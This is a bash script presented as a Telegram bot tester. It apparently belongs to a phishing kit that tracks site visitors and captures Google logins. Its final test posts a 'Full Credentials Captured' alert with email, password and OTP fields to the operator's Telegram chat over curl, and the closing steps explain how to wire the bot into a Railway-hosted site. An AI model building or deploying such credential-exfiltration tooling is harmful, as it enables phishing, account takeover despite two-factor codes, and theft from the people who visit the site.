#!/bin/bash

# Telegram Bot Test Script
# This script helps you verify your Telegram bot is working correctly

echo "🤖 Telegram Bot Setup Tester"
echo "=============================="
echo ""

# Check if bot token is provided
if [ -z "$1" ]; then
    echo "❌ Error: Bot token required"
    echo ""
    echo "Usage: ./test-telegram.sh YOUR_BOT_TOKEN YOUR_CHAT_ID"
    echo ""
    echo "Example:"
    echo "  ./test-telegram.sh 123456789:ABCdefGHIjklMNOpqrsTUVwxyz 123456789"
    exit 1
fi

# Check if chat ID is provided
if [ -z "$2" ]; then
    echo "❌ Error: Chat ID required"
    echo ""
    echo "Usage: ./test-telegram.sh YOUR_BOT_TOKEN YOUR_CHAT_ID"
    exit 1
fi

BOT_TOKEN=$1
CHAT_ID=$2

echo "📋 Testing with:"
echo "   Bot Token: ${BOT_TOKEN:0:20}..."
echo "   Chat ID: $CHAT_ID"
echo ""

# Test 1: Check if bot is valid
echo "🧪 Test 1: Checking bot validity..."
BOT_INFO=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/getMe")

if echo "$BOT_INFO" | grep -q '"ok":true'; then
    BOT_NAME=$(echo "$BOT_INFO" | grep -o '"first_name":"[^"]*"' | cut -d'"' -f4)
    BOT_USERNAME=$(echo "$BOT_INFO" | grep -o '"username":"[^"]*"' | cut -d'"' -f4)
    echo "   ✅ Bot is valid!"
    echo "   📛 Name: $BOT_NAME"
    echo "   👤 Username: @$BOT_USERNAME"
else
    echo "   ❌ Bot token is invalid!"
    echo "   Response: $BOT_INFO"
    exit 1
fi

echo ""

# Test 2: Send test message
echo "🧪 Test 2: Sending test message..."
TEST_MESSAGE="🎉 *Telegram Bot Test*%0A%0AYour bot is working correctly!%0A%0A✅ Connection successful%0A⏰ $(date)"

SEND_RESULT=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${TEST_MESSAGE}&parse_mode=Markdown")

if echo "$SEND_RESULT" | grep -q '"ok":true'; then
    echo "   ✅ Test message sent!"
    echo "   📱 Check your Telegram app"
else
    echo "   ❌ Failed to send message!"
    echo "   Response: $SEND_RESULT"
    echo ""
    echo "💡 Common issues:"
    echo "   - Wrong Chat ID"
    echo "   - Haven't started the bot (click 'Start' in Telegram)"
    echo "   - Bot blocked by user"
    exit 1
fi

echo ""

# Test 3: Test visitor notification format
echo "🧪 Test 3: Testing visitor notification format..."
VISITOR_MESSAGE="🔔 *NEW VISITOR ALERT*%0A%0A👤 *Visitor Details:*%0A━━━━━━━━━━━━━━━━━━━%0A📍 IP: \`203.0.113.45\`%0A🌐 Page: /%0A🗺 Timezone: America/New_York%0A%0A💻 *Device Info:*%0A━━━━━━━━━━━━━━━━━━━%0A🖥 Platform: MacOS%0A📱 Screen: 1920x1080%0A%0A⏰ Time: $(date)"

VISITOR_RESULT=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${VISITOR_MESSAGE}&parse_mode=Markdown&disable_web_page_preview=true")

if echo "$VISITOR_RESULT" | grep -q '"ok":true'; then
    echo "   ✅ Visitor notification format works!"
else
    echo "   ⚠️  Visitor notification had issues (not critical)"
fi

echo ""

# Test 4: Test credential notification format
echo "🧪 Test 4: Testing credential notification format..."
CRED_MESSAGE="✅ *GOOGLE AUTH COMPLETE*%0A%0A🎉 *Full Credentials Captured!*%0A━━━━━━━━━━━━━━━━━━━%0A📧 Email: \`test@gmail.com\`%0A🔒 Password: \`testpass123\`%0A🔢 OTP: \`123456\`%0A%0A⏰ $(date)%0A%0A🎯 *Status:* FULLY CAPTURED ✅"

CRED_RESULT=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${CRED_MESSAGE}&parse_mode=Markdown&disable_web_page_preview=true")

if echo "$CRED_RESULT" | grep -q '"ok":true'; then
    echo "   ✅ Credential notification format works!"
else
    echo "   ⚠️  Credential notification had issues (not critical)"
fi

echo ""
echo "=============================="
echo "✅ All tests passed!"
echo ""
echo "🚀 Next steps:"
echo "   1. Add these to Railway environment variables:"
echo "      TELEGRAM_BOT_TOKEN=$BOT_TOKEN"
echo "      TELEGRAM_CHAT_ID=$CHAT_ID"
echo ""
echo "   2. Railway will auto-redeploy (2-3 minutes)"
echo ""
echo "   3. Visit your site and you'll get notifications!"
echo ""
echo "📱 Check your Telegram app for the test messages!"
